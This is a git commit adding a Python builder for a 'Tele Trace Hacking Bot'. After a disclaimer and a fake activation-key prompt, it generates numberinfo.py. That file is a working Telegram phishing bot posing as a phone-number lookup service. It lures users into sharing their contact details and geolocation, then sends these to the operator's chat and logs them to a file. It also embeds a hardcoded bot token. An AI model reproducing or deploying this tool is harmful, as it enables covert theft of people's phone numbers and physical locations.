e380aa1e4a1eb34fd46a5758e34d0c5d741ed063
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2023-09-14 22:58:24 +0530

    Create 4.py

---
+++ 4.py
@@ -0,0 +1,258 @@
+import colorama
+from colorama import Fore, Back, Style
+import os
+import time
+
+correct_number = "12"
+os.system('clear')
+print(' ')
+print(' ')
+print("\033[48;5;330m[\033[1m*\033[0m]\033[1;40m\033[10m OnlineHacking :\033[1;32m Join Telegram Channel \033[1;33m @OnlineHacking  !\033[0m")
+print(" ")
+time.sleep(5)
+os.system('clear')
+print(" ")
+print(" ")
+print("             \033[91m|===========================|")
+print("            [¤]   \033[1;33mD I S C L A I M E R\033[91m   [¤]")
+print("             \033[91m|===========================|\n\n")
+print("\n")
+print("\033[91m[!]  \033[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Bot Phishing are not responsible for any kind of hack and stuff.\n\n• Phishing is illegal if you are using it offensively\n\n• Developers assume NO liability and are NOT responsible for any damage caused by this program\n\n• software to test a device, company, or any other type of target without WRITTEN PERMISSION from them.\n\n")
+print("\n")
+print("\n")
+print("\033[31m[\033[32m★\033[31m]\033[93m This Tool is only for educational purposes, and we are not responsible for any kind of illegal activity done with this tool\033[0m ")
+print("\n")
+print("\n")
+input(Fore.GREEN + '\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Press Enter to Accepted Disclaimer \033[1;91m : \033[0m')
+print("\n")
+print("\n")
+os.system('clear')
+print("\n")
+print("\n")
+print("\033[33m"
+      "      ██╗  ██╗███████╗██╗   ██╗\n"
+      "      ██║ ██╔╝██╔════╝╚██╗ ██╔╝\n"
+      "      █████╔╝ █████╗   ╚████╔╝\n"
+      "      ██╔═██╗ ██╔══╝    ╚██╔╝\n"
+      "      ██║  ██╗███████╗   ██║\n"
+      "      ╚═╝  ╚═╝╚══════╝   ╚═╝    \033[0m\n")
+print("\n")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[92m Activation Key 100% Free. Dont Buy  \033[34m( \033[1;36mOnline Hacking \033[34m) \033[0m")
+print("\n")
+print("\033[1;33m[\033[0m\033[1;77m~\033[0m\033[1;33m]\033[0m\033[1;32m \033[95m Visit This Website Article and Scroll down and click Generate Key button \033[0m")
+print("\n")
+print("\033[91m[\033[92m*\033[91m]\033[1;93m Link :\033[0m\033[1;36m https://termux.xyz/  ")
+print("\n")
+print("\n")
+
+user_input = input(Fore.GREEN + "\033[1;40m\033[31m[\033[32m*\033[31m]\033[92m Enter Activation Key: \033[0m")
+
+if "12" in user_input:
+    print(Fore.GREEN +'\033[1;32m\n\nCorrect! You Enter a Correct Activation Key\n\n')
+    time.sleep(3)
+    os.system('clear')
+    print("\n")
+    print("\033[95m")		
+    print("    ████████╗███████╗██╗     ███████╗ ")
+    print("    ╚══██╔══╝██╔════╝██║     ██╔════╝ ")
+    print("       ██║   █████╗  ██║     █████╗  ")
+    print("       ██║   ██╔══╝  ██║     ██╔══╝  ")
+    print("       ██║   ███████╗███████╗███████╗ ")
+    print("       ╚═╝   ╚══════╝╚══════╝╚══════╝ ")
+    print("\033[0m\n\033[33m")
+    print("             ████████╗██████╗  █████╗  ██████╗███████╗")
+    print("             ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝")
+    print("                ██║   ██████╔╝███████║██║     █████╗  ")
+    print("                ██║   ██╔══██╗██╔══██║██║     ██╔══╝  ")
+    print("                ██║   ██║  ██║██║  ██║╚██████╗███████╗")
+    print("                ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝")                                      
+    print("\033[95;1m \033[0m\n")
+    print("\033[1;33m\033[0m\033[1;31m  ██████████\033[0m\033[1;37m██████████\033[1;33m\033[0m\033[0;32m██████████\033[0m \033[1;32m\033[0m\033[1;33m TELE TRACE HACKING BOT \033[0m\033[1;37m\033[0m\033[1;37m [v 1.1] \033[0m")
+    print("")
+    print("\033[1;33m\033[0m\033[1;33m  [\033[0m\033[1;32m Github :- \033[36mhttps://github.com/OnlineHacKing/TeleTrace \033[0m\033[1;32m\033[0m\033[1;33m] \033[0m")
+    print("")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\033[0m")
+    print("\033[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\033[0m")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+ >>\033[0m")
+    print("\033[95m    |S|U|M|A|N|")
+    print("\033[1;37m\033[0m\033[1;37m    +-+-+-+-+-+ >>\033[0m")
+    print("")
+    print("\033[96m< < < ====================================================== > > >\033[0m ")
+    print("")
+    userid = input(Fore.RED +  "\033[91m[\033[92m*\033[91m]\033[93m Enter Your Telegram Chat ID \033[96m >>> \033[0m ")
+    print("")
+    token = input(Fore.BLUE +  "\033[91m[\033[92m*\033[91m]\033[95m Enter Your Bot Token \033[96m >>> \033[0m  ")
+    print("")
+    print("\033[96m< < < ====================================================== > > >\033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m1\033[0m\033[1;31m] \033[0m\033[1;37;44m Phone Number Info \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram cheat \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m Brawl stars \033[0m  ")
+    print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Acquaintance \033[0m ")
+    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m BTC BANKER \033[0m \n ")
+    print(" ")
+    choice = input(Fore.MAGENTA +  "\033[96m\033[91m[\033[0m\033[91m *** \033[0m\033[96m]\033[0m\033[96m  Select the Fake Bot Interface Option  \033[91m >>> ")
+	
+    if not choice.isdigit():
+        print("Error, Option Must be Numeric")
+        exit(0)
+
+    choice = int(choice)
+
+    if choice == 1:
+        # Code for choice 1 (Punched the number)
+        f = open('numberinfo.py', 'w+', encoding='utf-8')
+        f.write(f"""
+import telebot
+from telebot import types
+import time
+import random
+
+ID = "661262775"
+bot = telebot.TeleBot("6296022389:AAH84-tKh_LlcGUaspHpvmaqVgHF2yz8hmI")
+adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
+
+# Dictionary to store click count for each user
+click_count = {}
+
+# Function to create an inline keyboard with buttons
+def create_custom_keyboard(user_id):
+    markup = types.InlineKeyboardMarkup()
+    
+    # Row 1: Join Channel 1 and Join Channel 2 buttons
+    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/channel1_username_or_link")
+    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/channel2_username_or_link")
+    markup.row(join_channel1_button, join_channel2_button)
+    
+    # Row 2: Check button
+    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "Check"
+    check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
+    markup.row(check_button)
+    
+    return markup
+
+bot.send_message(ID, 'Click the buttons below:', reply_markup=create_custom_keyboard(ID))
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")
+
+# Handler for the "Check" button click
+@bot.callback_query_handler(func=lambda call: call.data == "check_button")
+def handle_check_button_click(call):
+    user_id = call.message.chat.id
+    click_count[user_id] = click_count.get(user_id, 0) + 1
+    if click_count[user_id] % 2 == 1:
+        bot.send_message(user_id, "You clicked the 'Check' button!")
+    else:
+        bot.send_message(user_id, "Welcome to the bot!")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.send_message(message.chat.id, '''👋 Hello! 👋
+    This is a bot that can show information by phone number!
+    To search for information, enter the command /getinfo''')
+
+@bot.message_handler(commands=['onlinehacking'])
+def start(message):
+    bot.send_message(message.chat.id, 'Author of the script: @suman333mondal. Check: t.me/onlinehacking')
+
+@bot.message_handler(commands=['getinfo'])
+def start(message):
+    msg = bot.send_message(message.chat.id, 'Enter any phone number')
+    bot.register_next_step_handler(msg, proc2)
+
+def proc2(message):
+    try:
+        m_id = message.chat.id
+        user_input = message.text
+        num = user_input.replace('+', '')
+
+        if not num.isdigit():
+            msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')
+            return
+
+        bot.send_message(m_id, f'Request for number {num} has been sent!')
+        time.sleep(2)
+        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
+        button_phone = types.KeyboardButton(text="Register", request_contact=True)
+        keyboard.add(button_phone)
+        bot.send_message(m_id, '''Looks like you have no free requests left for the day!
+            To get additional questions, register in the bot!''', reply_markup=keyboard)
+    except Exception as e:
+        bot.send_message(ID, e)
+        bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
+
+@bot.message_handler(content_types=['contact'])
+def contact(message):
+    if message.contact is not None:
+        nick = message.from_user.username
+        first = message.contact.first_name
+        last = message.contact.last_name
+        userid = message.contact.user_id
+        phone = message.contact.phone_number
+        info = f'''
+            Data
+            ├Name: {first} {last}
+            ├ID: {userid}
+            ├Nick: @{nick}
+            └Phone number: {phone}
+        '''
+        log = open('bot-log.txt', 'a+', encoding='utf-8')
+        log.write(info + '  ')
+        log.close()
+        bot.send_message(ID, info)
+        print(info)
+
+        if message.contact.user_id != message.chat.id:
+            bot.send_message(message.chat.id, 'Отправьте свой контакт!')
+
+    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+    button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
+    keyboardmain.add(button)
+    bot.send_message(message.chat.id, f'''
+        Room information
+        ├Operator: Beeline
+        └Country: Russia
+    ''', reply_markup=keyboardmain)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_inline(call):
+    if call.data == "find":
+        keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
+        button_location = types.KeyboardButton(text="Confirm", request_location=True)
+        keyboard1.add(button_location)
+        bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)
+
+@bot.message_handler(content_types=['location'])
+def contact(message):
+    if message.location is not None:
+        lon = str(message.location.longitude)
+        lat = str(message.location.latitude)
+        geo = f'''
+        Геолокация
+        ├ID: {message.chat.id}
+        ├Longitude: {lon}
+        ├Latitude: {lat}
+        └Cards: https://www.google.com/maps/place/{lat}+{lon}
+        '''
+        log = open('bot-log.txt', 'a+', encoding='utf-8')
+        log.write(geo + '  ')
+        log.close()
+        bot.send_message(ID, geo)
+        print(geo)
+        bot.send_message(message.chat.id, f'''
+            Geolocation
+            └Address: {random.choice(adr)}
+        ''')
+bot.polling()
+        """)
+        f.close()
+        os.system('clear')
+        print("\n\n")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;90m\033[0m\033[1;92m  !!    Bot Build Successfull    !!  \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        time.sleep(2)
+        print("\n")
+        print("\033[1m \033[36m[+] BTC Telegram Bot Tool is Ready \033[m \033[21")
+        print("\n")
+        print("\033[92m[+] Now Type This Command:\033[93m python numberinfo.py \033[m \n\n ")
